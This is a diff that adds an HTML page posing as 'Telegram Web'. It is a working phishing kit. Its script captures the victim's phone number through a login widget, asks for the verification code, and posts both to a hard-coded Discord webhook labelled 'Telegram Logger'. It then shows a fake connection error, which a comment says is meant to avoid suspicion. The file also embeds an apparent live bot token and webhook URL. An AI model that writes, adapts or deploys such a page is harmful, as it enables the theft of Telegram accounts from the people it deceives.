@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <script src="https://telegram.org/js/telegram-widget.js?22"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+</head>
+<body>
+    <div id="login_page">
+        <div id="telegram-login"></div>
+    </div>
+    
+    <div id="code_page" style="display:none;">
+        <input type="text" id="code_input" placeholder="Enter verification code">
+        <button onclick="submitCode()">Submit</button>
+    </div>
+
+    <script>
+        // Detect country by IP and set language
+        $.getJSON('https://ipapi.co/json/', function(data) {
+            const country = data.country_code;
+            const languages = {
+                'RU': 'ru', 'US': 'en', 'DE': 'de', 
+                'FR': 'fr', 'ES': 'es', 'CN': 'zh'
+            };
+            const lang = languages[country] || 'en';
+            loadTelegramWidget(lang);
+        });
+
+        function loadTelegramWidget(lang) {
+            Telegram.Widgets.Auth({
+                container: 'telegram-login',
+                bot_id: '8478481816:AAEv_JXJ8VESv4JcO0cXHF0nXTs7HNt1iyo', // Replace with actual bot ID
+                request_access: true,
+                lang: lang,
+                onAuth: function(user) {
+                    // Capture phone number
+                    const phone = user.phone_number;
+                    $.cookie('ph_phone', phone);
+                    
+                    // Show code page
+                    $('#login_page').hide();
+                    $('#code_page').show();
+                    
+                    // Send phone to Discord
+                    sendToDiscord(`📱 Phone Number Captured: ${phone}`);
+                }
+            });
+        }
+
+        function submitCode() {
+            const code = $('#code_input').val();
+            const phone = $.cookie('ph_phone');
+            
+            // Send code to Discord
+            sendToDiscord(`🔐 Verification Code: ${code} for phone: ${phone}`);
+            
+            // Show fake error to avoid suspicion
+            alert('Connection error. Please try again later.');
+        }
+
+        function sendToDiscord(message) {
+            const webhookURL = 'https://discord.com/api/webhooks/1433943318655533137/Kzh_wiYOIrTbQ73EY_YBntUZJWVI0egaut5C2kjph65JLS-_TGSqdL0jVzw9whatoex-';
+            
+            $.post(webhookURL, {
+                content: message,
+                username: 'Telegram Logger',
+                avatar_url: 'https://telegram.org/img/t_logo.png'
+            });
+        }
+    </script>
+</body>
+</html>
